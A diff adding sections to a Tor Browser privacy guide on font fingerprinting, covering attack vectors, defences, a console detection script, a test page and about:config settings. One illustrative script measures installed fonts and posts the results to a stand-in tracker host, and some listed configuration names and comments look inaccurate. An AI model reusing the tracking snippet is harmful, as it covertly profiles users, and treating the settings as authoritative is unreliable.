@@ -118,6 +118,247 @@ Resist the temptation to customize Tor Browser's appearance excessively. Themes,
 
 When using the Safest security level, test critical websites you visit regularly. Some legitimate sites require JavaScript font access for proper functionality. You can create exceptions for trusted sites while maintaining the highest protection level elsewhere.
 
+## Font Fingerprinting Attack Vectors
+
+Understanding how trackers extract font information helps appreciate Tor Browser's defenses:
+
+**Vector 1: CSS Fallback Chain Timing**
+Trackers measure how long it takes to render text with progressively less common fonts. If a font isn't available, rendering takes longer due to fallback processing. By timing multiple fonts, attackers build a unique profile.
+
+**Vector 2: Canvas Text Measurement**
+JavaScript can render text to an HTML canvas element and measure pixel dimensions. Different fonts produce different widths for identical text, revealing which fonts are installed.
+
+```javascript
+// Example of canvas fingerprinting attack
+function detectFonts() {
+    const canvas = document.createElement("canvas");
+    const ctx = canvas.getContext("2d");
+    const testString = "mmmmmmmmmlli";
+    const textSize = "72px";
+
+    const fonts = ["Arial", "Verdana", "Times New Roman", "Courier"];
+    const measurements = {};
+
+    fonts.forEach(font => {
+        ctx.font = `${textSize} ${font}`;
+        const width = ctx.measureText(testString).width;
+        measurements[font] = width;
+    });
+
+    // Send measurements to tracker server
+    fetch('//tracker.example.com/fonts', {
+        method: 'POST',
+        body: JSON.stringify(measurements)
+    });
+}
+```
+
+Tor Browser prevents this attack by:
+1. Limiting available fonts to a standard set
+2. Disabling the Canvas API fingerprinting methods
+3. Randomizing canvas rendering to produce inconsistent results
+
+**Vector 3: CSS Font Load Events**
+Websites can listen to `@font-face` load events to determine which fonts successfully loaded, inferring system fonts.
+
+**Vector 4: DOM Metrics Measurement**
+JavaScript measures DOM element heights and widths, which vary based on available fonts. Different font metrics (ascender height, baseline, x-height) produce detectable differences.
+
+Tor Browser's letterboxing defense prevents this by constraining the content area to fixed dimensions.
+
+## Security Levels Comparison
+
+| Feature | Standard | Safer | Safest |
+|---------|----------|-------|--------|
+| System Fonts Allowed | Most | Minimal | Core Only |
+| JavaScript Enabled | Yes | Yes | No |
+| Font Enumeration Blocked | Partial | Full | Full |
+| Canvas Fingerprinting | Mitigated | Mitigated | Blocked |
+| WebGL Fingerprinting | Mitigated | Mitigated | Blocked |
+| Plugin Fingerprinting | Mitigated | Mitigated | Blocked |
+| User Experience Impact | Minimal | Moderate | High |
+
+## Technical Deep Dive: Font Normalization
+
+Tor Browser implements font normalization through several mechanisms:
+
+```javascript
+// Tor Browser's privacy.resistFingerprinting logic
+// (Simplified conceptual example)
+
+const SAFE_FONTS = [
+    "Arial", "Helvetica", "Times New Roman", "Courier New",
+    "DejaVu Sans", "Liberation Sans", "Liberation Serif"
+];
+
+function normalizeFonts(requestedFont) {
+    // Only allow fonts in the safe list
+    if (SAFE_FONTS.includes(requestedFont)) {
+        return requestedFont;
+    }
+
+    // For unknown fonts, return a generic fallback
+    const fontFamily = requestedFont.toLowerCase();
+    if (fontFamily.includes('serif')) {
+        return "Times New Roman";
+    } else if (fontFamily.includes('mono')) {
+        return "Courier New";
+    } else {
+        return "Arial";  // Default sans-serif fallback
+    }
+}
+
+// Font enumeration returns consistent results across all users
+function enumerateFonts() {
+    // Always return the same set, regardless of system
+    return SAFE_FONTS;
+}
+```
+
+This normalization ensures that JavaScript queries for available fonts always receive identical results, eliminating the fingerprinting vector.
+
+## Identifying Font Fingerprinting Attempts
+
+Monitor your Tor Browser console for suspicious font-related activity:
+
+```javascript
+// Detection script - run in browser console
+// Watch for font enumeration attempts
+
+const originalGetComputedStyle = window.getComputedStyle;
+window.getComputedStyle = function(element, pseudoElement) {
+    const result = originalGetComputedStyle.call(this, element, pseudoElement);
+
+    if (result.font || result.fontFamily) {
+        console.warn("Potential font fingerprinting attempt detected");
+        console.trace();
+    }
+
+    return result;
+};
+
+// Monitor Canvas operations
+const originalMeasureText = CanvasRenderingContext2D.prototype.measureText;
+CanvasRenderingContext2D.prototype.measureText = function(text) {
+    console.warn("Canvas text measurement detected - potential fingerprinting");
+    return originalMeasureText.call(this, text);
+};
+```
+
+In Safest mode, many of these operations will be unavailable, blocking the attack.
+
+## Testing Specific Font Protection
+
+Create a test to verify Tor Browser's font protections:
+
+```html
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Tor Browser Font Protection Test</title>
+</head>
+<body>
+    <h1>Font Fingerprinting Defense Test</h1>
+
+    <div id="results"></div>
+
+    <script>
+    const results = document.getElementById('results');
+
+    // Test 1: Font enumeration
+    try {
+        console.log("Test 1: Font Enumeration");
+        const fonts = Array.from(document.fonts).map(f => f.family);
+        console.log("Enumerated fonts:", fonts);
+        results.innerHTML += "<p>Fonts enumerated: " + fonts.length + "</p>";
+    } catch (e) {
+        results.innerHTML += "<p>Font enumeration blocked: " + e.message + "</p>";
+    }
+
+    // Test 2: Canvas text rendering
+    try {
+        console.log("Test 2: Canvas Text Measurement");
+        const canvas = document.createElement('canvas');
+        const ctx = canvas.getContext('2d');
+        ctx.font = "16px Arial";
+        const width1 = ctx.measureText("test").width;
+
+        ctx.font = "16px NonexistentFont";
+        const width2 = ctx.measureText("test").width;
+
+        if (width1 === width2) {
+            results.innerHTML += "<p>Canvas measurements normalized: Good</p>";
+        } else {
+            results.innerHTML += "<p>Canvas reveals font differences: Vulnerable</p>";
+        }
+    } catch (e) {
+        results.innerHTML += "<p>Canvas test blocked: " + e.message + "</p>";
+    }
+
+    // Test 3: WebGL renderer fingerprinting
+    try {
+        console.log("Test 3: WebGL Detection");
+        const canvas = document.createElement('canvas');
+        const gl = canvas.getContext('webgl');
+        const renderer = gl.getParameter(gl.RENDERER);
+        results.innerHTML += "<p>WebGL renderer: " + renderer + "</p>";
+    } catch (e) {
+        results.innerHTML += "<p>WebGL blocked or unavailable: Good</p>";
+    }
+    </script>
+</body>
+</html>
+```
+
+View this test in Tor Browser at different security levels to observe how defenses vary.
+
+## Complementary Protections
+
+Font fingerprinting is just one of many fingerprinting vectors. Combine Tor Browser's protections with these additional measures:
+
+**Canvas Fingerprinting**: Tor Browser randomizes canvas rendering through `privacy.resistFingerprinting`. Test at coverYourTracks.eff.org to verify protection.
+
+**WebGL Fingerprinting**: GPU capabilities reveal information about hardware. Tor Browser disables WebGL in Safest mode.
+
+**Timezone Fingerprinting**: `privacy.resistFingerprinting` sets timezone to UTC for all users.
+
+**Language Fingerprinting**: Accept-Language headers are normalized to match Tor Browser's default language.
+
+The cumulative effect: even if one fingerprinting vector leaks information, the others remain protected, maintaining anonymity through a diverse fingerprint pool.
+
+## Font Configuration for Maximum Privacy
+
+For maximum privacy, manually configure these about:config settings:
+
+```
+# Disable font smoothing (can reveal hardware)
+browser.display.use_font_map_smoothing = false
+
+# Disable dynamic font loading
+dom.webfont.fontmanager.enabled = false
+
+# Restrict fonts to baseline set
+font.default.sans-serif = "Arial"
+font.default.serif = "Times New Roman"
+font.default.monospace = "Courier New"
+
+# Disable font size zooming per-domain
+browser.zoom.text_only = true
+```
+
+Apply these in addition to the security slider settings for defense-in-depth.
+
+## Monitoring Font Fingerprinting Threats
+
+Watch for new font fingerprinting techniques:
+
+Subscribe to:
+- Tor Browser security announcements
+- EFF privacy technology updates
+- Academic papers on browser fingerprinting
+
+The threat landscape continuously evolves. New JavaScript APIs (like Font Metrics API) may introduce new vectors requiring Tor Project updates.
+
 ## Related Reading
 
 - [Privacy Tools Guides Hub](/privacy-tools-guide/guides-hub/)
@@ -126,7 +367,6 @@ When using the Safest security level, test critical websites you visit regularly
 - [Tor Browser Canvas Fingerprinting Protection](/privacy-tools-guide/tor-browser-canvas-fingerprinting-protection/)
 - [How Browser Fingerprinting Works Explained: A Technical.](/privacy-tools-guide/how-browser-fingerprinting-works-explained/)
 
-Built by
-
 Built by theluckystrike — More at [zovo.one](https://zovo.one)
+
 {% endraw %}
